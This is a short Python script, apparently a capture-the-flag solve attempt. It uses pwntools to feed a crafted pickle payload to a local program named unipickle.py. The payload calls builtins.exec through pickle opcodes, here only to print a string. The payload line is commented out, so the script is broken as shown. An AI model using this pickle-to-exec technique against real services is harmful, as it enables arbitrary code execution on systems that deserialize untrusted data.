import pickle
import pickletools
import pwn

# d = "U\x08builtinsU\x04execœU&print('hiiiiiiiiiiiiiiiiiiiiiiiiiiii')\x85R.".encode()
print(d)
p = pwn.process(["python3", "unipickle.py"])
p.sendline(d)
p.interactive()
